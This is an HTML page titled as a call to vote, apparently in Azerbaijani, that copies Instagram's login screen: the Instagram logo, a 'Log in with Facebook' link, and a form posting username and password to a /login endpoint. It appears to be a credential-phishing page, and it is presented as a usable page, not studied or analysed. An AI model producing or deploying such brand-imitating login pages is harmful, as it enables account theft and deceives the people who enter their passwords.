<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DGKA-s…ôs ver</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }

        .container {
            width: 350px;
            background-color: #fff;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .logo {
            background-image: url('https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram-1.png');
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 300px;
            height: 100px;
            margin: 0 auto 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 3px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            padding: 12px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #007bff;
        }

        .or {
            text-align: center;
            margin-top: 20px;
            margin-bottom: 10px;
            color: #666;
            position: relative;
        }

        .or::before,
        .or::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #ccc;
        }

        .or::before {
            left: 0;
        }

        .or::after {
            right: 0;
        }

        .facebook {
            text-align: center;
            margin: 20px 0 10px;
            color: #00376b;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook img {
            width: 20px; 
            height: 20px; 
            margin-right: 8px; 
        }

        .forgot-password {
            text-align: center;
            color: #00376b; 
            cursor: pointer;
            margin-top: 20px; 
            font-size: 14px; 
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo"></div>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="or">OR</div>
        <div class="facebook">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            Log in with Facebook
        </div>
        <div class="forgot-password">Forgot Password?</div>
    </div>

</body>
</html>
